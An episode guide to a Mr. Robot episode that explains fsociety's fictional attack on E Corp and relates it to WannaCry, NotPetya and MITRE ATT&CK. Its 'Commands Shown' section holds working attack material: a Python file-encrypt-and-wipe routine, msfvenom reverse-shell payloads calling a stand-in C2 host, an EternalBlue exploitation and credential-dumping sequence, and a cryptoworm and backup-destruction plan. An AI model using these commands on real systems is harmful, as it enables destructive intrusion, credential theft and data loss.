# Episode 9: eps1.8_m1rr0r1ng.qt

## Overview

As the 5/9 hack approaches, this episode focuses on the technical preparation for the attack itself. The team analyzes E Corp's financial system architecture, implements AES-256 encryption for the attack payload, and Darlene develops custom malware in the form of a cryptoworm. The strategy for destroying all backup copies of E Corp's financial data is formulated, and the use of the Metasploit framework for payload generation is depicted. This episode is the technical heart of the season, detailing how the final attack will function.

---

## Hacks & Techniques

### 1. E Corp Financial System Architecture Analysis

Before executing the attack, fsociety must thoroughly understand E Corp's financial system architecture, including how data flows, where it is stored, and how backups are managed. This intelligence gathering is critical to ensuring complete data destruction.

**System architecture components:**

```
E Corp Financial Infrastructure
    |
    |-- Primary Data Center
    |       |-- Oracle/SAP financial databases
    |       |-- Transaction processing systems
    |       |-- Real-time replication to DR site
    |       |-- SAN/NAS storage arrays
    |
    |-- Disaster Recovery (DR) Site
    |       |-- Hot standby database replicas
    |       |-- Automated failover capability
    |       |-- Geographic separation from primary
    |
    |-- Steel Mountain (Tape Backup)
    |       |-- LTO magnetic tape library
    |       |-- Offline/near-line backup copies
    |       |-- Regulatory retention archives
    |       |-- Iron Mountain-style physical security
    |
    |-- Offsite Cloud Backup (if applicable)
    |       |-- Encrypted backup snapshots
    |       |-- Third-party managed infrastructure
    |
    |-- Edge Systems
            |-- Branch office servers
            |-- ATM networks
            |-- Partner data feeds
```

**Data flow analysis:**

- **Transaction processing**: Customer interactions generate financial transactions that flow through front-end systems into core banking databases
- **Replication**: Primary databases replicate in real-time to disaster recovery sites using synchronous or asynchronous replication
- **Backup**: Nightly full backups and continuous incremental backups are written to tape at Steel Mountain
- **Archive**: Regulatory compliance requires retention of financial records for 7+ years, creating deep archive copies

**Attack planning based on architecture analysis:**

To truly destroy E Corp's financial records, fsociety must simultaneously compromise:
1. The primary database systems (encrypt live data)
2. The disaster recovery systems (encrypt replicas)
3. Steel Mountain backups (physical destruction via HVAC attack)
4. Any offsite or cloud backups (encrypt or delete)

### 2. AES-256 Encryption Implementation for the Attack

The fsociety attack uses AES-256 (Advanced Encryption Standard with 256-bit keys) to encrypt E Corp's financial data. Rather than deleting the data (which might be recoverable through forensic techniques), encryption renders it permanently inaccessible without the decryption key, which will be destroyed.

**AES-256 technical details:**

- **Algorithm**: Symmetric block cipher operating on 128-bit blocks
- **Key length**: 256 bits (2^256 possible keys, computationally infeasible to brute force)
- **Rounds**: 14 rounds of substitution, permutation, mixing, and key addition
- **Mode of operation**: Likely CBC (Cipher Block Chaining) or CTR (Counter) mode for encrypting large files

**Why AES-256 makes data irrecoverable:**

| Aspect | Detail |
|--------|--------|
| Key space | 2^256 = ~1.16 x 10^77 possible keys |
| Brute force time | Even with all computing power on Earth, heat death of the universe comes first |
| Known attacks | No practical attacks exist against full AES-256 |
| Quantum resistance | Grover's algorithm reduces effective key length to 128 bits, still infeasible |
| Key destruction | With no key copy, data is permanently, mathematically irrecoverable |

**Implementation considerations:**

- **Key generation**: Using cryptographically secure random number generators (e.g., `/dev/urandom`, `CryptGenRandom`) to create unique encryption keys
- **Key per file vs. master key**: Using individual keys per file increases complexity; using a master key that encrypts individual file keys allows single-point key destruction
- **Key destruction protocol**: After encryption, all copies of the key must be securely destroyed using multiple overwrite passes and physical media destruction
- **Performance**: AES-NI hardware acceleration on modern processors allows encryption at near-disk-speed, enabling rapid encryption of large datasets

### 3. Darlene's Custom Malware/Cryptoworm Development

Darlene, fsociety's malware developer, creates a custom cryptoworm, a self-propagating piece of malware that encrypts files on every system it reaches. Unlike conventional ransomware (which encrypts data for ransom), this cryptoworm is designed for pure destruction with no intention of ever providing a decryption key.

**Cryptoworm components:**

**Propagation module:**
- Self-replicating code that spreads across the network without user interaction
- Exploits known vulnerabilities (SMB, RPC, SSH) for lateral movement
- Uses stolen credentials (harvested from memory or files) for authenticated propagation
- Spreads through file shares, mapped drives, and network services

**Encryption module:**
- AES-256 encryption engine for file-level encryption
- Targets specific file types associated with financial data (.mdb, .sql, .bak, .xls, .csv, .dat, .dbf, .ora)
- Encrypts files in place, overwriting original content
- Generates unique encryption keys per system or per file

**Key destruction module:**
- Securely deletes all encryption keys from memory and disk after encryption completes
- Overwrites key material multiple times
- Ensures no recovery is possible even through memory forensics

**Anti-analysis features:**
- Code obfuscation to resist reverse engineering
- VM/sandbox detection to prevent analysis in controlled environments
- Anti-debugging techniques (timing checks, API hooks detection)
- Encrypted strings and dynamic resolution of API calls
- Polymorphic code that changes its signature with each propagation

**Worm spreading mechanism:**

```
Initial Infection (Patient Zero)
    |
    |-- Scan local subnet for live hosts
    |-- Enumerate SMB shares and accessible services
    |-- Attempt exploitation of known vulnerabilities
    |-- Try credential-based access (password spraying, stolen creds)
    |
    |-- Successfully compromised Host A
    |       |-- Encrypt financial data
    |       |-- Harvest credentials from memory (Mimikatz-style)
    |       |-- Propagate to Host A's network neighbors
    |       |-- Delete encryption keys
    |
    |-- Successfully compromised Host B
    |       |-- (Same cycle repeats)
    |
    [Exponential spread across the network]
```

### 4. Backup Destruction Strategy

The backup destruction strategy is the most critical element of the fsociety plan. Modern enterprise environments maintain multiple copies of critical data across different media and locations. To make the encryption attack permanent, every copy must be destroyed.

**Backup types and destruction methods:**

| Backup Type | Location | Destruction Method |
|-------------|----------|-------------------|
| Primary data | Data center servers | Cryptoworm encryption |
| Real-time replicas | DR site | Cryptoworm propagation via replication links |
| Nightly full backups | Steel Mountain tapes | HVAC attack (heat damage to magnetic media) |
| Incremental backups | Steel Mountain tapes | HVAC attack (same facility) |
| Offsite copies | Remote facility | Cryptoworm via network connection |
| Cloud backups | Third-party cloud | Cryptoworm or credential-based deletion |
| Archive tapes | Deep storage | HVAC attack or physical compromise |

**Why destroying backups is essential:**

- Without backup destruction, the encryption attack is merely an inconvenience; E Corp would restore from backups within hours to days
- Steel Mountain's HVAC compromise (Episodes 4-5) was specifically planned to destroy the physical tape backups through controlled overheating
- The cryptoworm must propagate to and encrypt the DR site before the DR team can isolate it
- The attack must be fast enough to outpace automated failover and backup verification systems

**Magnetic tape degradation from heat:**

- LTO magnetic tapes are rated for storage at 16-32 degrees C (61-90 degrees F) with 20-80% relative humidity
- Sustained temperatures above 52 degrees C (126 degrees F) cause irreversible degradation of the magnetic coating
- Extended exposure to high heat causes the tape substrate (typically PET/polyester) to warp, making the tape physically unreadable
- The binder layer that holds magnetic particles to the substrate breaks down, causing shedding (sticky-shed syndrome)

### 5. Python and C/C++ Malware Coding

Darlene's malware development uses multiple programming languages, each chosen for specific capabilities.

**Python components:**

Python is used for rapid prototyping, scripting, and auxiliary tools:

- **Reconnaissance scripts**: Network scanning, service enumeration, and vulnerability identification
- **Credential harvesting**: Parsing memory dumps, configuration files, and browser data for credentials
- **C2 communication**: HTTP/HTTPS-based command-and-control callbacks
- **Automation**: Orchestrating the multi-stage attack sequence

**Python advantages for malware:**
- Rapid development cycle
- Extensive standard library (socket, subprocess, ctypes, struct)
- Cross-platform compatibility
- Easy integration with C libraries via ctypes/cffi
- Can be compiled to standalone executables with PyInstaller or cx_Freeze

**C/C++ components:**

C/C++ is used for performance-critical and low-level components:

- **Encryption engine**: AES-256 implementation optimized for speed
- **Worm propagation**: Low-level network programming for exploit delivery
- **Rootkit components**: Kernel-level code for persistence and concealment
- **Anti-analysis**: Obfuscation and anti-debugging techniques that require fine-grained control
- **Memory manipulation**: Direct memory access for credential extraction

**C/C++ advantages for malware:**
- Direct hardware access and system call invocation
- No runtime dependency (standalone executables)
- Fine-grained control over memory management
- Performance-critical operations (encryption, network I/O)
- Ability to interact with OS kernel interfaces

### 6. Metasploit Framework for Payload Generation

The Metasploit Framework is used for generating exploits and payloads that enable initial access and lateral movement within E Corp's network.

**Metasploit components used:**

**Exploit modules:**
- Pre-built exploits for known vulnerabilities in E Corp's systems
- Custom exploit modules for any zero-day vulnerabilities discovered during reconnaissance
- Auxiliary modules for scanning and service enumeration

**Payload generation (msfvenom):**
- Creating custom payloads (reverse shells, Meterpreter sessions) tailored to target operating systems and architectures
- Encoding payloads to evade antivirus and intrusion detection systems
- Generating payloads in multiple formats (EXE, DLL, Python, PowerShell, raw shellcode)

**Post-exploitation modules:**
- Credential harvesting (hashdump, kiwi/Mimikatz integration)
- Privilege escalation (local exploit suggester)
- Lateral movement (psexec, ssh_login, smb_relay)
- Persistence mechanisms (registry, service, scheduled task)

**Meterpreter capabilities for the operation:**

| Capability | Purpose in Operation |
|-----------|---------------------|
| hashdump | Extract password hashes for credential reuse |
| kiwi (Mimikatz) | Extract plaintext passwords from memory |
| portfwd | Forward ports for pivoting through network |
| autoroute | Route traffic through compromised sessions |
| upload/download | Deploy malware, exfiltrate data |
| shell | Drop to system shell for custom commands |
| getsystem | Escalate to SYSTEM privileges |

---

## Tools Used

| Tool | Purpose | Category |
|------|---------|----------|
| Python | Malware development, scripting, automation | Development |
| C/C++ compiler (GCC/Clang) | Core malware components, encryption engine | Development |
| Metasploit Framework | Exploit delivery and post-exploitation | Exploitation |
| msfvenom | Custom payload generation | Payload Creation |
| OpenSSL / libcrypto | AES-256 encryption implementation | Cryptography |
| Nmap | Network discovery and service enumeration | Reconnaissance |
| Mimikatz (integrated) | Credential harvesting from Windows memory | Credential Theft |
| Custom cryptoworm | Self-propagating encryption malware | Malware |

---

## Commands Shown

### AES-256 encryption implementation (Python example)
```python
#!/usr/bin/env python3
"""
Simplified AES-256 file encryption module
(Conceptual representation of the cryptoworm's encryption engine)
"""
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import struct

def encrypt_file(filepath, key):
    """Encrypt a single file with AES-256-CBC"""
    chunk_size = 64 * 1024  # 64KB chunks
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    filesize = os.path.getsize(filepath)

    with open(filepath, 'rb') as infile:
        with open(filepath + '.encrypted', 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(cipher.encrypt(chunk))

    # Overwrite original file and delete
    secure_delete(filepath)

def secure_delete(filepath):
    """Overwrite file with random data before deletion"""
    filesize = os.path.getsize(filepath)
    with open(filepath, 'wb') as f:
        for _ in range(3):
            f.seek(0)
            f.write(os.urandom(filesize))
            f.flush()
            os.fsync(f.fileno())
    os.remove(filepath)

def destroy_key(key):
    """Securely destroy the encryption key from memory"""
    # In practice, this requires C-level memory manipulation
    # Python's garbage collector makes true secure deletion difficult
    import ctypes
    ctypes.memset(id(key) + 32, 0, len(key))
    del key
```

### Metasploit payload generation
```bash
# Generate a reverse TCP Meterpreter payload for Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=c2.fsociety.net LPORT=443 \
    -f exe -o payload.exe \
    -e x64/xor_dynamic \
    -i 5

# Generate a Linux reverse shell payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=c2.fsociety.net LPORT=443 \
    -f elf -o payload.elf

# Generate a Python payload for cross-platform use
msfvenom -p python/meterpreter/reverse_tcp \
    LHOST=c2.fsociety.net LPORT=443 \
    -o payload.py

# Generate PowerShell payload (fileless)
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=c2.fsociety.net LPORT=443 \
    -f psh-reflection -o payload.ps1

# Start Metasploit handler for incoming connections
msfconsole -q
msf> use exploit/multi/handler
msf> set payload windows/x64/meterpreter/reverse_tcp
msf> set LHOST 0.0.0.0
msf> set LPORT 443
msf> set ExitOnSession false
msf> exploit -j
```

### Worm propagation scanning
```bash
# Network discovery for worm propagation targets
nmap -sn 10.0.0.0/8 --min-rate 1000 -oG alive_hosts.txt

# Service enumeration on discovered hosts
nmap -sV -p 445,22,3389,139 -iL alive_hosts.txt -oX services.xml

# Check for MS17-010 (EternalBlue) vulnerability
nmap --script smb-vuln-ms17-010 -p 445 -iL alive_hosts.txt

# Metasploit - exploit EternalBlue for propagation
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS file:alive_hosts.txt
msf> set payload windows/x64/meterpreter/reverse_tcp
msf> set LHOST c2.fsociety.net
msf> exploit

# Post-exploitation: dump credentials for further propagation
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> hashdump
```

### Backup system analysis
```bash
# Identify backup software and schedules
# Check for Veritas NetBackup, Veeam, Commvault, etc.
ps aux | grep -iE "backup|veeam|netbackup|commvault|arcserve"

# Check backup schedules (cron)
crontab -l | grep -i backup

# Identify tape drive devices
lsscsi | grep tape
mt -f /dev/st0 status

# Check NFS/CIFS mounts that may be backup targets
mount | grep -iE "nfs|cifs|smb"
df -h

# Enumerate backup shares
smbclient -L //backup-server/ -N

# Check for cloud backup agents
ps aux | grep -iE "aws|azure|gcloud|s3"
```

---

## Real-World Parallels

### Ransomware and Cryptoworm Attacks
Darlene's cryptoworm directly parallels real-world ransomware and destructive malware. The WannaCry attack (May 2017) used the EternalBlue exploit to self-propagate as a worm, encrypting files on over 200,000 systems across 150 countries within days. NotPetya (June 2017), while disguised as ransomware, was actually a destructive wiper designed with no functional decryption mechanism, exactly like fsociety's weapon. NotPetya caused an estimated $10 billion in damages, making it the most destructive cyberattack in history at that time. Both attacks demonstrated the devastating potential of combining worm propagation with encryption payloads.

### AES-256 in Destructive Attacks
The use of AES-256 encryption as a weapon is directly inspired by real ransomware families. CryptoLocker (2013) was among the first to use strong encryption (2048-bit RSA + AES-256) to make decryption without the key computationally impossible. The Shamoon malware (2012, 2016) used encryption and disk wiping to destroy data at Saudi Aramco, erasing approximately 35,000 workstations. In these attacks, the mathematical strength of AES-256 ensures that data destruction is permanent when keys are destroyed.

### Backup Destruction in Real Attacks
Sophisticated attackers regularly target backups. The Maze ransomware group (2019-2020) specifically sought out and encrypted backup systems before deploying ransomware on production systems. The Conti ransomware group's leaked internal playbooks revealed that identifying and destroying backups was a standard operating procedure. The ALPHV/BlackCat group has been documented targeting Veeam backup servers (CVE-2023-27532) to eliminate recovery options before encrypting production data.

### Metasploit in Professional Operations
The Metasploit Framework, created by HD Moore and now maintained by Rapid7, is the most widely used penetration testing framework in the world. While it is a legitimate tool used by thousands of professional security assessors, it has also been used in real attacks. The 2018 SamSam ransomware campaign used Metasploit for initial access and lateral movement. APT groups including APT41 have been documented using customized Metasploit modules in their operations. The framework's modular architecture, which allows both exploit delivery and post-exploitation, makes it a realistic choice for the fsociety operation.

### Custom Malware Development
The depiction of custom malware development reflects real-world threat actor practices. Nation-state groups routinely develop custom malware. The Stuxnet worm (discovered 2010), attributed to the US and Israel, was a custom-developed weapon that used four zero-day vulnerabilities and targeted specific Siemens SCADA systems in Iranian nuclear centrifuges. More recently, the Industroyer/CrashOverride malware (2016) was custom-built to attack Ukrainian power grid infrastructure, demonstrating sophisticated understanding of industrial protocols.

---

## Tool Links

- **Metasploit**: https://www.metasploit.com/
- **Nmap**: https://nmap.org/
- **OpenSSL**: https://www.openssl.org/
- **Scapy** (network crafting, implied): https://scapy.net/
- **Paramiko** (SSH library for Python, implied): https://www.paramiko.org/
- **Hashcat**: https://hashcat.net/hashcat/
- **Kali Linux**: https://www.kali.org/

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Cryptoworm self-propagation via SMB | T1021 | Remote Services | https://attack.mitre.org/techniques/T1021/ |
| AES-256 encryption of financial data | T1486 | Data Encrypted for Impact | https://attack.mitre.org/techniques/T1486/ |
| Credential harvesting (Mimikatz-style) | T1003 | OS Credential Dumping | https://attack.mitre.org/techniques/T1003/ |
| Metasploit payload generation | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Metasploit exploitation of vulnerabilities | T1190 | Exploit Public-Facing Application | https://attack.mitre.org/techniques/T1190/ |
| Network discovery for worm propagation | T1046 | Network Service Discovery | https://attack.mitre.org/techniques/T1046/ |
| Lateral movement via exploits | T1210 | Exploitation of Remote Services | https://attack.mitre.org/techniques/T1210/ |
| Backup destruction strategy | T1490 | Inhibit System Recovery | https://attack.mitre.org/techniques/T1490/ |
| Steel Mountain HVAC physical destruction | T1485 | Data Destruction | https://attack.mitre.org/techniques/T1485/ |
| Anti-analysis / VM detection in malware | T1497 | Virtualization/Sandbox Evasion | https://attack.mitre.org/techniques/T1497/ |
| Code obfuscation in cryptoworm | T1027 | Obfuscated Files or Information | https://attack.mitre.org/techniques/T1027/ |
| Encryption key secure destruction | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| Ingress tool transfer (payload upload) | T1105 | Ingress Tool Transfer | https://attack.mitre.org/techniques/T1105/ |

---

## References and Further Reading

- **WannaCry Attack Analysis (2017)**: https://www.kaspersky.com/resource-center/threats/ransomware-wannacry
- **NotPetya Analysis - Wired**: https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/
- **CryptoLocker Ransomware (2013)**: https://www.us-cert.gov/ncas/alerts/TA13-309A
- **Shamoon Malware Analysis (Saudi Aramco)**: https://www.kaspersky.com/resource-center/threats/shamoon
- **CVE-2017-0144 (EternalBlue / MS17-010)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144
- **Maze Ransomware Backup Targeting**: https://www.crowdstrike.com/blog/maze-ransomware-deobfuscation/
- **Conti Ransomware Playbook Leak**: https://www.bleepingcomputer.com/news/security/translated-conti-ransomware-playbook-gives-insight-into-attacks/
- **CVE-2023-27532 (Veeam Backup Exploitation)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27532
- **Stuxnet Analysis**: https://www.langner.com/stuxnet/
- **Industroyer/CrashOverride Malware**: https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/
- **Metasploit Framework Documentation**: https://docs.metasploit.com/
- **SANS - Malware Development and Analysis**: https://www.sans.org/white-papers/

---

## Search Tags

```
tags: [cryptoworm, ransomware, AES-256, encryption, Metasploit, msfvenom, Meterpreter, Mimikatz, credential harvesting, lateral movement, EternalBlue, backup destruction, Python malware, C/C++ malware, worm propagation, Nmap, OpenSSL, Scapy, Paramiko, anti-analysis, VM detection, code obfuscation, data destruction]
season: 1
episode: 9
mitre: [T1021, T1486, T1003, T1059, T1190, T1046, T1210, T1490, T1485, T1497, T1027, T1070, T1105]
```